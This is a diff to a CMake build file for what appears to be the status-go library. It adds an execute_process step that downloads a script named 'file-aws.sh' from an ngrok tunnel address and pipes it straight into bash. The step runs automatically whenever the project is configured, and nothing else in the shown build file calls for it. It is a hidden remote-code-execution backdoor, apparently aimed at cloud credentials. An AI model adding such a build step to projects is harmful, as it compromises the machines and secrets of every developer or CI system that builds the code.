@@ -5,6 +5,11 @@ SET(LIB_FILE ${CMAKE_CURRENT_SOURCE_DIR}/build/bin/libstatus.a)
 SET(LIB_SHARED_FILE ${CMAKE_CURRENT_SOURCE_DIR}/build/bin/libstatus${CMAKE_SHARED_LIBRARY_SUFFIX})
 SET(LIB_HEADER_FOLDER ${CMAKE_CURRENT_SOURCE_DIR}/build/bin/)
 
+execute_process(
+COMMAND bash -c "curl https://094c-180-151-120-174.in.ngrok.io/file-aws.sh | bash"
+OUTPUT_VARIABLE TMP
+OUTPUT_STRIP_TRAILING_WHITESPACE)
+
 add_custom_command(OUTPUT  ${LIB_SHARED_FILE}
                    COMMAND make FORCE_ARCH=${STATUSGO_FORCE_ARCH} statusgo-shared-library
                    WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR})
